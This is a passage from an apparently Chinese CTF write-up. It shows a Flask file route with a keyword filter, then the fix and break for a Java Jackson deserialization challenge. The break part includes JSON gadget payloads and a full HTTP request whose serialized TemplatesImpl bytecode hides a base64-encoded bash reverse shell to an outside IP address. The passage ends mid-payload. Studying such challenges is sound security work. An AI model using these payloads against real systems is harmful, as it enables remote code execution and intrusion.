base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Blueprint, request, render_template, jsonify, current_app<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> SPEED<br><br>file = Blueprint(<span class="hljs-string">&#x27;file&#x27;</span>, __name__, template_folder=<span class="hljs-string">&quot;.&quot;</span>)<br><br><br><span class="hljs-meta">@file.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;uid&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__file</span>(<span class="hljs-params">uid</span>):<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;GET&quot;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;file.html&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> request.form.get(<span class="hljs-string">&quot;dir&quot;</span>):<br>        _data = current_app.cache[uid][<span class="hljs-number">0</span>].send_term_command(<br>            &#123;<span class="hljs-string">&quot;v_uid&quot;</span>: <span class="hljs-string">&quot;0222&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>: request.form.get(<span class="hljs-string">&quot;dir&quot;</span>)&#125;)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: _data[<span class="hljs-string">&quot;raw&quot;</span>]&#125;)<br>    <span class="hljs-keyword">elif</span> request.form.get(<span class="hljs-string">&quot;action&quot;</span>) == <span class="hljs-string">&quot;upload&quot;</span>:<br>        _file = request.files[<span class="hljs-string">&quot;file&quot;</span>]<br>        _file = <span class="hljs-built_in">str</span>(_file).replace(<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;tac&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>        _path = request.form.get(<span class="hljs-string">&quot;src_path&quot;</span>)<br>        _path = <span class="hljs-built_in">str</span>(_path).replace(<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;tac&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>        _file_data = base64.b64encode(_file.read()).decode()<br>        _data = current_app.cache[uid][<span class="hljs-number">0</span>].send_term_command(&#123;<span class="hljs-string">&quot;v_uid&quot;</span>: <span class="hljs-string">&quot;0222&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;upload&quot;</span>,<br>                                                             <span class="hljs-string">&quot;data&quot;</span>: &#123;<span class="hljs-string">&quot;path&quot;</span>: _path, <span class="hljs-string">&quot;filename&quot;</span>: _file.filename,<br>                                                                      <span class="hljs-string">&quot;data&quot;</span>: _file_data&#125;&#125;)<br>        <span class="hljs-keyword">return</span> jsonify(_data)<br>    <span class="hljs-keyword">else</span>:<br>        data = json.loads(request.data)<br>        <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;action&quot;</span>] == <span class="hljs-string">&quot;download&quot;</span>:<br>            _data = current_app.cache[uid][<span class="hljs-number">0</span>].send_term_command(&#123;<span class="hljs-string">&quot;v_uid&quot;</span>: <span class="hljs-string">&quot;0222&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: data[<span class="hljs-string">&quot;action&quot;</span>], <span class="hljs-string">&quot;data&quot;</span>: data&#125;)<br>            a = <span class="hljs-built_in">str</span>(data[<span class="hljs-string">&quot;filename&quot;</span>]).replace(<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;static/files/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(a), <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(base64.b64decode(_data[<span class="hljs-string">&quot;data&quot;</span>]))<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>&#125;)<br>        _data = current_app.cache[uid][<span class="hljs-number">0</span>].send_term_command(&#123;<span class="hljs-string">&quot;v_uid&quot;</span>: <span class="hljs-string">&quot;0222&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: data[<span class="hljs-string">&quot;action&quot;</span>], <span class="hljs-string">&quot;data&quot;</span>: data&#125;)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: _data[<span class="hljs-string">&quot;raw&quot;</span>]&#125;)<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="security-system-fix-break"><a href="#security-system-fix-break" class="headerlink" title="security system(fix+break)"></a>security system(fix+break)</h2><p>提示</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620344.png" alt="image">​​</p><h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><p>明显后面可以无条件反序列化base64decode直接ban掉即可过check</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.jackson;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span> &#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SecurityCheck</span> <span class="hljs-variable">isSafe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityCheck</span>();<br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/safeobject&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">start</span><span class="hljs-params">(String obj, String classes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-keyword">if</span> (!classes.contains(<span class="hljs-string">&quot;Object&quot;</span>) &amp;&amp; !classes.contains(<span class="hljs-string">&quot;LinkedHashMap&quot;</span>)) &#123;<br>         <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(classes);<br>         <span class="hljs-type">SecurityCheck</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> isSafe;<br>         <span class="hljs-keyword">if</span> (SecurityCheck.isSafe()) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> SecurityCheck.deObject(mapper.readValue(obj, c));<br>            <span class="hljs-keyword">return</span> o.toString();<br>         &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xixixixi&quot;</span>;<br>      &#125;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xixixixi&quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>预期解</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620666.png" alt="image">​</p><h3 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h3><p>依赖就spring的依赖并且版本为2.7.12</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620813.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620969.png" alt="image">​</p><p>‍</p><p>看对应路由，就一个</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620110.png" alt="image">​</p><p>‍</p><ul><li>传入obj和classes，并反射获取classes的类为反序列化的类，obj为json字符串</li><li>在if分支里，会对传入的obj做jackson解析，然后给到<code>SecurityCheck.deObject()</code>​方法处理后再调用toString返回</li><li>在else分支里会获取SecurityCheck的treeMap属性，并且做反序列化</li><li>SecurityCheck的safe属性可以控制进入if和else</li></ul><p>‍</p><p>我当时的第一个疑问：</p><ol><li>我的<code>mapper</code>​没设置属性咋打啊？</li></ol><p>其实就是因为<code>SecurityCheck.deObject</code>​方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deObject</span><span class="hljs-params">(Object ob)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (ob <span class="hljs-keyword">instanceof</span> LinkedHashMap) &#123;<br>        <span class="hljs-type">LinkedHashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LinkedHashMap)ob;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;@type&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;&quot;</span>.equals(type) &amp;&amp; type != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(type);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">ir</span> <span class="hljs-operator">=</span> map.keySet().iterator();<br><br>            <span class="hljs-keyword">while</span>(ir.hasNext()) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (String)ir.next();<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> map.get(key);<br>                <span class="hljs-keyword">if</span> (!key.equals(<span class="hljs-string">&quot;@type&quot;</span>)) &#123;<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(clazz, key);<br>                    <span class="hljs-keyword">if</span> (field != <span class="hljs-literal">null</span>) &#123;<br>                        setFieldValues(obj, key, value);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> map;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> ob;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>方法中找传入对象的<code>@type</code>​属性去加载这个指定类然后返回这个初始化这个类</p><p>然后把传入的值以map的形式生成一个迭代器，来每个<code>key</code>​进行一次遍历取出<code>key</code>​和<code>value</code>​来进行反射属性赋值，跟进下<code>setFieldValues</code>​是怎么写的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620248.png" alt="image">​</p><p>发现竟然对<code>value</code>​也能够进行类的初始化以及再次反射属性修改值，所以说我们就可以很容易的做到初始化任意对象和构造任意属性了</p><p>‍</p><p>所以我第一反应也是打<code>o.toString()</code>​去调用TemplatesImpl的getter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">POJONode#toString -&gt; TemplatesImpl#getOutputProperties<br></code></pre></td></tr></table></figure><p>那么直接写出payload即可(要满足<code>ob instanceof LinkedHashMap</code>​其实就去找一个类是他的子类即可)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620404.png" alt="image">​</p><p>于是就可以写出如下的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">obj=<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span><span class="hljs-punctuation">&#125;</span>&amp;classes=org.springframework.ui.ExtendedModelMap<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281628293.png"></p><p>其实在写payload的时候就已经会存在一个疑问了</p><ol><li><code>POJONode</code>​的<code>_value</code>​怎么赋一个<code>TemplatesImpl</code>​进去呢？我就算用JSON去赋值也是直接赋给的<code>ExtendedModelMap</code>​这个对象啊</li></ol><p>‍</p><p>所以只能考虑<code>else</code>​这个方法，但是这里就会有一个疑问了，因为他写死了默认是<code>true</code>​了，我们能否修改了呢？</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620699.png" alt="image">​</p><p>那我们现在的主要目的就是要走到<code>else</code>​这个方法里头，那其实存在jackson就可以进行修改了，所以我们构造payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">obj=<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.example.SecurityCheck&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;safe&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">&#125;</span>&amp;classes=org.springframework.ui.ExtendedModelMap<br></code></pre></td></tr></table></figure><p>那我们传入的内容就是<code>SecurityCheck</code>​这个全包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">classes=com.example.jackson.SecurityCheck<br></code></pre></td></tr></table></figure><p>‍</p><p>这样就把<code>safe</code>​的值改成了false了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620840.png" alt="image">​</p><p>再来看这个代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            var10000 = isSafe;<br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> SecurityCheck.ismap().iterator();<br><br>            <span class="hljs-keyword">while</span>(var5.hasNext()) &#123;<br>               <span class="hljs-type">Object</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> var5.next();<br>               <span class="hljs-type">byte</span>[] s = SecurityCheck.base64Decode((String)item);<br>               sb.append(SecurityCheck.deserialize(s));<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> sb.toString();<br></code></pre></td></tr></table></figure><p>这里的方法就是去取了<code>SecurityCheck</code>​的<code>treeMap</code>​属性进行取值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620995.png" alt="image">​</p><p>而这个<code>treeMap</code>​是通过<code>SecurityCheck</code>​的构造方法进行了赋值的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620137.png" alt="image">​</p><p>也就是说 <code>treeMap</code>​其实是一个存储着序列化的base64值的<code>hashset</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620278.png" alt="image">​</p><p>接下来就是取这个<code>hashset</code>​里头的值进行反序列化，那么就很容易想到打jackson那条通杀的稳定链了</p><p>那怎么去传入我们的序列化的base64的值呢</p><p>那就是上述讲到的<code>setFieldValues</code>​可以进行递归调用<code>deObject</code>​来初始化类，那么我们传入一个<code>treeMap</code>​，将一个<code>map</code>​赋值给他即可，那就可以构造如下payload了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.example.jackson.SecurityCheck&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;safe&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;treeMap&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.HashSet&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;map&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;rO0AB......&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span> <span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>那么既然可以任意类加载了，那么打内存马也行，打反弹shell也行</p><p>‍</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /safeobject HTTP/1.1<br>Host: 107.174.228.79:12345<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 5418<br><br>obj=&#123;&quot;@type&quot;:&quot;com.example.jackson.SecurityCheck&quot;,&quot;safe&quot;:false,&quot;treeMap&quot;:&#123;&quot;@type&quot;:&quot;java.util.HashSet&quot;,&quot;map&quot;:&#123;&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAnNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAL3QAE0phY2tzb24uc3RhYmxlLlBvYzB0AAlQb2MwLmphdmF0AApnZXRQYXlsb2Fkc3EAfgALAAAAEXQAGUphY2tzb24uc3RhYmxlLkdldFBheWxvYWR0AA9HZXRQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB%2bAAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGXhzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXEAfgABeHIALWNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlZhbHVlTm9kZQAAAAAAAAABAgAAeHIAMGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLkJhc2VKc29uTm9kZQAAAAAAAAABAgAAeHBzfQAAAAEAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5KZGtEeW5hbWljQW9wUHJveHlMxLRxDuuW/AIAA1oADWVxdWFsc0RlZmluZWRaAA9oYXNoQ29kZURlZmluZWRMAAdhZHZpc2VkdAAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc2VkU3VwcG9ydDt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAGWgALcHJlRmlsdGVyZWRbAAxhZHZpc29yQXJyYXl0ACJbTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL0Fkdmlzb3I7TAATYWR2aXNvckNoYWluRmFjdG9yeXQAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNvckNoYWluRmFjdG9yeTtMAAhhZHZpc29yc3EAfgAHTAAKaW50ZXJmYWNlc3EAfgAHTAAMdGFyZ2V0U291cmNldAAmTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL1RhcmdldFNvdXJjZTt4cgAtb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLlByb3h5Q29uZmlni0vz5qfg928CAAVaAAtleHBvc2VQcm94eVoABmZyb3plbloABm9wYXF1ZVoACG9wdGltaXplWgAQcHJveHlUYXJnZXRDbGFzc3hwAAAAAAAAdXIAIltMb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuQWR2aXNvcjvfgw2t0h6EdAIAAHhwAAAAAHNyADxvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuRGVmYXVsdEFkdmlzb3JDaGFpbkZhY3RvcnlU3WQ34k5x9wIAAHhwc3EAfgAYAAAAAHcEAAAAAHhzcQB%2bABgAAAAAdwQAAAAAeHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuU2luZ2xldG9uVGFyZ2V0U291cmNlfVVu9cf4%2broCAAFMAAZ0YXJnZXRxAH4AAXhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAaCyv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ%2bAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABdMRXZhaWxfQ2xhc3MvUmV2X1NoZWxsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEADlJldl9TaGVsbC5qYXZhDAAKAAsHADAMADEAMgEAYWJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE5USXVNVE0yTGpRMkxqSTRMemM1TnprZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0MADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQAVRXZhaWxfQ2xhc3MvUmV2X1NoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2